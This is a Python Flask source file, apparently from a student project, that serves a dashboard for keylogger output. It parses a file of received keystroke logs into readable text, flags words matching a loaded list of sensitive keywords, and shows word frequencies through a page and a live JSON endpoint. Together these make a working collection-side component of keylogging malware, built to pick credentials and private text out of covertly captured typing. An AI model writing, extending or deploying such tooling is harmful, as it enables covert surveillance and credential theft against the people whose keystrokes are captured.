from flask import Flask, render_template, jsonify
import re
from collections import Counter
import os

app = Flask(__name__)

# 🔹 Path to your keylog file
LOG_PATH = r"C:\Users\chall\Downloads\final project\backend/received_logs.txt" 
# 🔹 Sensitive keywords

def load_keywords():
    with open("keywords.txt", "r", encoding="utf-8") as f:
        return [line.strip().lower() for line in f]

KEYWORDS = load_keywords()
# 🔹 Convert keylog into readable text
def parse_keylog(file_path):
    readable_text = ""

    if not os.path.exists(file_path):
        return "Log file not found."

    try:
        with open(file_path, "r", encoding="utf-8") as file:
            lines = file.readlines()
    except:
        return "Unable to read log file."

    for line in lines:
        if " - " not in line:
            continue

        key_part = line.split(" - ")[1].strip()

        if len(key_part) == 1:
            readable_text += key_part

        elif "<" in key_part and ">" in key_part:
            ascii_code = re.findall(r"<(\d+)>", key_part)
            if ascii_code:
                readable_text += chr(int(ascii_code[0]))

        elif "Key.backspace" in key_part:
            readable_text = readable_text[:-1]

        elif "Key.enter" in key_part:
            readable_text += "\n"

        elif "Key.space" in key_part:
            readable_text += " "

        else:
            continue

    return readable_text


# 🔹 Detect sensitive keywords
def detect_keywords(text):
    found_words = []
    words = text.split()

    for word in words:
        for keyword in KEYWORDS:
            if keyword.lower() in word.lower():
                found_words.append(word)

    return list(set(found_words))


# 🔹 Word frequency
def word_frequency(text):
    words = re.findall(r'\b\w+\b', text.lower())
    return Counter(words).most_common(10)


# 🔹 Main dashboard page
@app.route("/")
def dashboard():
    parsed_text = parse_keylog(LOG_PATH)
    detected_words = detect_keywords(parsed_text)
    frequency = word_frequency(parsed_text)

    return render_template(
        "dashboard.html",
        text=parsed_text,
        detected=detected_words,
        frequency=frequency
    )


# 🔹 Live data API (updates every second)
@app.route("/live-data")
def live_data():
    parsed_text = parse_keylog(LOG_PATH)
    detected_words = detect_keywords(parsed_text)
    frequency = word_frequency(parsed_text)

    return jsonify({
        "text": parsed_text,
        "detected": detected_words,
        "frequency": frequency
    })


if __name__ == "__main__":
    app.run(debug=True, port=3000)